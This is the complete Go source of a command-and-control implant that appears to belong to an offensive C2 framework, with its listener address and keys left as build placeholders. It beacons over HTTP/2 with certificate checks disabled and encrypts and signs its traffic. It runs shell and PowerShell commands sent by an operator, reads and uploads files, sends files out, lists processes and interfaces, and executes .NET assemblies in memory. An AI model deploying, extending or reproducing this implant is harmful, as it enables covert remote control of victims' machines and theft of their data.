package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	uuid "github.com/satori/go.uuid"
	"golang.org/x/net/http2"
	"io"
	"io/ioutil"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"../implants/execute-assembly"

	"../messages"
	"../implants/ps"
)

const _timeLayout = "2006-01-02 15:04:05"

type implant struct {
	UUID              uuid.UUID
	httpClient        *http.Client
	pid               int
	ppid              int
	OS                string
	CWD               string
	hostname          string
	architecture      string
	username          string
	userID            string
	killDate          int64
	sleepTime         time.Duration
	jitter            int
	maxRetry          int
	failedCheckin     int
	checkedIn         bool
	listenerAddress   string
	listenerUUID      uuid.UUID
	listenerEndpoints []string
	AESKey            []byte
	HMACKey           string
	postHeaders       map[string]string
	getHeaders        map[string]string
	implantType       string
	mutexLock         *sync.Mutex
}

func main() {

	listenerAddress := "https://claddr"
	listenerUUID := "cluuid"
	endpoints := "cendpoints"
	if strings.HasSuffix(listenerAddress, "/") {
		endpoints = strings.Replace(endpoints, "/", "", -1)
	} else {
		if !strings.Contains(endpoints, "/") {
			listenerAddress += "/"
		}
	}
	endpointsSlice := strings.Split(endpoints, ":")

	postRequestHeaders := make(map[string]string)
	getRequestHeaders := make(map[string]string)
	postHeaders := "cpostheaders"
	getHeaders := "cgetheaders"

	splitPostHeaders := strings.Split(postHeaders, "<--")
	for _, line := range splitPostHeaders {
		splittedLine := strings.Split(line, "-->")
		postRequestHeaders[splittedLine[0]] = splittedLine[1]
	}
	splitGetHeaders := strings.Split(getHeaders, "<--")
	for _, line := range splitGetHeaders {
		splittedLine := strings.Split(line, "-->")
		getRequestHeaders[splittedLine[0]] = splittedLine[1]
	}

	tmpTime, err := time.Parse("2006-01-02 15:04:05", "ckilldate")
	if err != nil {
		panic(err)
	}
	killDate := tmpTime.UTC().UnixNano()
	maxRetry := cmaxretry
	sleepTime := time.Second * csleeptime
	jitter := cjitter
	AESKey := []byte("caesk")
	HMACKey := []byte("chmack")
	// Hash encryption keys
	hash := md5.New()
	hash.Write(AESKey)
	hashedAESKey := hex.EncodeToString(hash.Sum(nil))
	hash.Reset()
	hash.Write(HMACKey)
	hashedHMACKey := hex.EncodeToString(hash.Sum(nil))

	tlsConfig := &tls.Config {
		InsecureSkipVerify:   true,
		NextProtos:           []string{"h2"},
	}
	clientTransport := &http2.Transport {
		TLSClientConfig:   tlsConfig,
	}

	CWD, _ := os.Getwd()
	hostname, _ := os.Hostname()
	userDetails, _ := user.Current()

	konqueror := implant{
		UUID:              uuid.Must(uuid.NewV4()),
		httpClient:        &http.Client{
			Transport:     clientTransport,
		},
		pid:               os.Getpid(),
		ppid: 			   os.Getppid(),
		OS:                runtime.GOOS,
		CWD:               CWD,
		hostname:          hostname,
		architecture:      runtime.GOARCH,
		username:          userDetails.Username,
		userID:            userDetails.Uid,
		killDate:          killDate,
		sleepTime:         sleepTime,
		jitter:            jitter,
		maxRetry:          maxRetry,
		failedCheckin:     0,
		checkedIn:         false,
		listenerAddress:   listenerAddress,
		listenerUUID:      uuid.Must(uuid.FromString(listenerUUID)),
		AESKey:            []byte(hashedAESKey),
		HMACKey:           hashedHMACKey,
		listenerEndpoints: endpointsSlice,
		postHeaders:       postRequestHeaders,
		getHeaders:        getRequestHeaders,
		implantType:       "http2",
		mutexLock:         &sync.Mutex{},
	}

	defer func() {
		task := messages.Task{
			Type:         "implant shutdown",
			UUID:         uuid.Must(uuid.NewV4()),
			ListenerUUID: konqueror.listenerUUID,
			ImplantUUID:  konqueror.UUID,
		}

		JSONTask, err := json.Marshal(task)
		if err != nil {
			panic(err)
		}

		base64Task := base64.StdEncoding.EncodeToString(JSONTask)
		encryptedTask := konqueror.encrypt([]byte(base64Task))
		messageSignature := konqueror.computeHMAC([]byte(encryptedTask))

		result := messages.C2Message{
			Message:      encryptedTask,
			HMAC:         messageSignature,
			Type:         "implant shutdown",
			ListenerUUID: konqueror.listenerUUID,
		}

		_, err = konqueror.doPost(result)
	}()

	for {

		if time.Now().UTC().UnixNano() < konqueror.killDate {
			if konqueror.failedCheckin >= konqueror.maxRetry {
				os.Exit(1)
			}

			if konqueror.checkedIn {
				konqueror.beacon()
			} else {
				konqueror.firstCheckIn()
			}
			konqueror.randomSleep()
		} else {
			os.Exit(0)
		}
	}
}


func (konqueror *implant) execute(task messages.Task) {

	now := time.Now()
	date := now.Format(_timeLayout)

	task.Date = date

	switch task.Type {
	case "cmd":

		stdout, stderr := konqueror.executeShellCommand(task.Args, "cmd")

		if stderr != "" {
			task.Result = stderr
			task.Success = false
		} else {

			if task.Args[0] == "cd" {
				// Windows VS Unix
				if konqueror.OS == "windows" {
					if strings.HasPrefix(task.Args[1], "\\") {
						konqueror.CWD = task.Args[1]
					} else {
						if strings.HasSuffix(konqueror.CWD, "\\") {
							konqueror.CWD += task.Args[1]
						} else {
							konqueror.CWD += "\\" + task.Args[1]
						}
					}
				} else {

					if strings.HasPrefix(task.Args[1], "/") {
						konqueror.CWD = task.Args[1]
					} else {
						if strings.HasSuffix(konqueror.CWD, "/") {
							konqueror.CWD += task.Args[1]
						} else {
							konqueror.CWD += "/" + task.Args[1]
						}
					}
				}
			}

			task.Result = stdout
			task.Success = true
		}
	case "ls":

		files, err := ioutil.ReadDir(task.Args[0])
		if err != nil {
			task.Success = false
			task.Result = err.Error()
			break
		}
		task.Success = true

		var allFileNames []string
		for _, file := range files {
			if file.IsDir() {
				allFileNames = append(allFileNames, "d" + file.Mode().Perm().String() + "   " + file.Name())
			} else {
				allFileNames = append(allFileNames, "f" + file.Mode().Perm().String() + "   " + file.Name())
			}
		}
		task.Result = strings.Join(allFileNames, "\n")
	case "set":

		switch task.Args[0] {
		case "Jitter":

			jitter, err := strconv.Atoi(task.Args[1])
			if err != nil {
				task.Result = err.Error()
				task.Success = false
				break
			}

			konqueror.jitter = jitter
			task.Result = "Successfully set " + task.Args[0] + " to " + task.Args[1]
			task.Success = true
		case "Sleep":

			sleep, err := strconv.Atoi(task.Args[1])
			if err != nil {
				task.Result = err.Error()
				task.Success = false
				break
			}

			konqueror.sleepTime = time.Second * time.Duration(sleep)
			task.Result = "Successfully set " + task.Args[0] + " to " + task.Args[1]
			task.Success = true
		case "KillDate":

			newDate, err := time.Parse(_timeLayout, task.Args[1])
			if err != nil {
				task.Result = err.Error()
				task.Success = false
				break
			}
			konqueror.killDate = newDate.UTC().UnixNano()
			task.Result = "Successfully set " + task.Args[0] + " to " + task.Args[1]
			task.Success = true
		default:
			task.Success = false
			task.Result = "The implant has no field " + task.Args[0]
		}

		if task.Success {
			task.Result = "Successfully set " + task.Args[0] + " to " + task.Args[1]
		}
	case "powershell":

		stdout, stderr := konqueror.executeShellCommand(task.Args, "powershell")

		if stderr != "" {
			task.Result = stderr
			task.Success = false
		} else {

			if task.Args[0] == "cd" {
				if strings.HasPrefix(task.Args[1], "\\") {
					konqueror.CWD = task.Args[1]
				} else {
					if strings.HasSuffix(konqueror.CWD, "\\") {
						konqueror.CWD += task.Args[1]
					} else {
						konqueror.CWD += "\\" + task.Args[1]
					}
				}
			}

			task.Result = stdout
			task.Success = true
		}
	case "ifconfig":
		var result string

		interfaces, err := net.Interfaces()
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}

		for _, iface := range interfaces {
			address, err := iface.Addrs()
			if err != nil {
				fmt.Println("DEBUG: ", err)
				continue
			}
			for _, addr := range address {
				result += iface.Name + " --> " + addr.String() + "\n"
			}
		}
		task.Success = true
		task.Result = result
	case "ps":

		processList, err := ps.Processes()
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}

		var result string
		for x := range processList {
			var process ps.Process
			process = processList[x]
			result += "PPID:\t " +
				strconv.Itoa(process.PPid()) +
				"\tPID:\t" +
				strconv.Itoa(process.Pid()) +
				"\tProgram:\t" + process.Executable() +
				"\tOwner:\t" + process.Owner() + "\n"
		}
		task.Result = result
		task.Success = true
	case "cat":

		fullPath := konqueror.formatPath(task.Args[0])

		if !konqueror.checkFile(fullPath) {
			task.Success = false
			task.Result = "The file does not exists"
			break
		}

		file, err := os.Open(fullPath)
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}

		reader := bufio.NewReader(file)
		content, err := ioutil.ReadAll(reader)
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		task.Success = true

		task.Result = base64.StdEncoding.EncodeToString(content)
	case "upload":

		decodedFile, err := base64.StdEncoding.DecodeString(task.Args[0])
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}

		file, err := os.Create(task.Args[1])
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		defer file.Close()

		if _, err := file.Write(decodedFile); err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		if err := file.Sync(); err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		task.Success = true
		task.Result = "Successfully uploaded the file to " + task.Args[1]
	case "download":

		if !konqueror.checkFile(task.Args[0]) {
			task.Result = "The file does not exists"
			task.Success = false
			break
		}

		fullPath := konqueror.formatPath(task.Args[0])
		file, err := os.Open(fullPath)
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		defer file.Close()

		reader := bufio.NewReader(file)
		content, err := ioutil.ReadAll(reader)
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}

		task.Result = base64.StdEncoding.EncodeToString(content)
		task.Success = true
	case "execute-assembly":

		clr, err := base64.StdEncoding.DecodeString(task.Args[0])
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}
		assembly, err := base64.StdEncoding.DecodeString(task.Args[1])
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}

		offset, err := strconv.ParseUint(task.Args[4], 10, 32)
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}

		result, err := execute_assembly.ExecuteAssembly(clr, assembly, task.Args[2], task.Args[3], true, true,  uint32(offset))
		if err != nil {
			task.Result = err.Error()
			task.Success = false
			break
		}

		task.Result = result
		task.Success = true

		task.Args = []string{}
	case "kill listener":
		os.Exit(0)
	case "kill implant":
		os.Exit(0)
	}

	JSONTask, err := json.Marshal(task)
	if err != nil {
		panic(err)
	}

	base64Task := base64.StdEncoding.EncodeToString(JSONTask)
	encryptedTask := konqueror.encrypt([]byte(base64Task))
	messageSignature := konqueror.computeHMAC([]byte(encryptedTask))

	result := messages.C2Message{
		Message:      encryptedTask,
		HMAC:         messageSignature,
		Type:         "result",
		ListenerUUID: konqueror.listenerUUID,
	}

	response, err := konqueror.doPost(result)
	if err != nil {
		konqueror.failedCheckin++
		fmt.Println(err)
	} else {
		if response.StatusCode != 200 {
			konqueror.failedCheckin++
		} else {
			if konqueror.failedCheckin > 0 && konqueror.failedCheckin < konqueror.maxRetry{
				konqueror.failedCheckin = 0
			}
		}
	}
}

func (konqueror *implant) beacon() {

	konqueror.randomSleep()

	request, err := http.NewRequest("GET", konqueror.listenerAddress + konqueror.getEndpoint(), nil)
	if err != nil {
		konqueror.failedCheckin++
		return
	}

	for index, value := range konqueror.getHeaders {
		request.Header.Set(index, value)
	}
	response, err := konqueror.httpClient.Do(request)
	if err != nil {
		konqueror.failedCheckin++
		return
	}

	if response.StatusCode == 200 {
		var task messages.Task
		decoder := json.NewDecoder(response.Body)
		err := decoder.Decode(&task)
		if err != nil {
			panic(err)
		}
		konqueror.execute(task)
	}
}

func (konqueror *implant) firstCheckIn() {

	implantDetails := messages.Implant{
		UUID:          konqueror.UUID,
		CWD:           konqueror.CWD,
		OS:            konqueror.OS,
		Arch:          konqueror.architecture,
		Jitter:        konqueror.jitter,
		UserID:        konqueror.userID,
		Hostname:      konqueror.hostname,
		FailedCheckIn: konqueror.failedCheckin,
		MaxRetry:      konqueror.maxRetry,
		PID:           konqueror.pid,
		PPID:          konqueror.ppid,
		Username:      konqueror.username,
		SleepTime:     konqueror.sleepTime,
		ListenerUUID:  konqueror.listenerUUID,
		Status:        "Active",
		KillDate:      konqueror.killDate,
		Type:          konqueror.implantType,
	}

	implantDetailsJSON, err := json.Marshal(implantDetails)
	if err != nil {
		panic(err)
	}

	implantDetailsBase64 := base64.StdEncoding.EncodeToString(implantDetailsJSON)

	encryptedDetails := konqueror.encrypt([]byte(implantDetailsBase64))

	messageSignature := konqueror.computeHMAC([]byte(encryptedDetails))

	message := messages.C2Message{
		Message:      encryptedDetails,
		HMAC:         messageSignature,
		Type:         "first checkin",
		ListenerUUID: konqueror.listenerUUID,
	}

	response, err := konqueror.doPost(message)
	if err != nil || response.StatusCode != 200 {
		konqueror.failedCheckin++
		return
	}

	konqueror.checkedIn = true

	if konqueror.failedCheckin > 0 {
		konqueror.failedCheckin = 0
	}

}

func (konqueror *implant) doPost(message interface{}) (*http.Response, error) {

	buffer := new(bytes.Buffer)
	err := json.NewEncoder(buffer).Encode(message)
	if err != nil {
		return nil ,err
	}

	listenerFullAddress := konqueror.listenerAddress + konqueror.getEndpoint()

	request, err := http.NewRequest("POST", listenerFullAddress, buffer)
	if err != nil {
		return nil, err
	}

	for index, value := range konqueror.postHeaders {
		request.Header.Set(index, value)
	}

	response, err := konqueror.httpClient.Do(request)
	if err != nil {
		return nil, err
	}

	return response, nil
}

func (konqueror *implant) getEndpoint() string {
	reader := rand.Reader

	index, err := rand.Int(reader, big.NewInt(int64(len(konqueror.listenerEndpoints))))
	if err != nil {
		return konqueror.listenerEndpoints[0]
	}
	return konqueror.listenerEndpoints[int(index.Int64())]
}

func (konqueror *implant) encrypt(data []byte) string {

	aesCipher, err := aes.NewCipher(konqueror.AESKey)
	if err != nil {
		panic(err)
	}

	gcm, err := cipher.NewGCM(aesCipher)
	if err != nil {
		panic(err)
	}

	nonce := make([]byte, gcm.NonceSize())

	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err)
	}

	cipherText := gcm.Seal(nonce, nonce, data, nil)
	return base64.RawStdEncoding.EncodeToString(cipherText)
}

func (konqueror *implant) computeHMAC(data []byte) string {
	h := hmac.New(sha256.New, []byte(konqueror.HMACKey))
	h.Write(data)
	mac := hex.EncodeToString(h.Sum(nil))
	return mac
}

func (konqueror *implant) randomSleep() {
	reader := rand.Reader
	jitter, err := rand.Int(reader, big.NewInt(int64(konqueror.jitter)))
	if err != nil {
		panic(err)
	}
	time.Sleep(konqueror.sleepTime + time.Second * time.Duration(jitter.Int64()))
}

func (konqueror *implant) executeShellCommand(command []string, shellType string) (string, string) {
	switch shellType {
	case "cmd":
		var shell, arg1 string
		if konqueror.OS == "windows" {
			shell = "cmd.exe"
			arg1 = "/c"
		} else {
			shell = "/bin/bash"
			arg1 = "-c"
		}

		commands := strings.Join(command, " ")
		allCommand := "cd " + konqueror.CWD + " &&" + commands
		result := exec.Command(shell, arg1, allCommand)

		var stdout, stderr bytes.Buffer
		result.Stdout = &stdout
		result.Stderr = &stderr
		err := result.Run()
		if err != nil {
			return "", err.Error()
		}
		return stdout.String(), stderr.String()
	case "powershell":
		var shell = "powershell.exe"
		commands := strings.Join(command, " ")
		allCommand := "cd " + konqueror.CWD + " ; " + commands
		result := exec.Command(shell, allCommand)
		var stdout, stderr bytes.Buffer
		result.Stdout = &stdout
		result.Stderr = &stderr
		err := result.Run()
		if err != nil {
			return "", err.Error()
		}
		return stdout.String(), stderr.String()
	}
	return "",""
}

func (konqueror *implant) checkFile(filePath string) bool {
	if _, err := os.Stat(filePath); err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

func (konqueror *implant) formatPath(filePath string) string {
	if strings.HasPrefix(filePath, "C:\\") || strings.HasPrefix(filePath, "/") {
		return filePath
	} else {
		if konqueror.OS == "windows" {
			return konqueror.CWD + "\\" + filePath
		} else {
			return konqueror.CWD + "/" + filePath
		}
	}
}
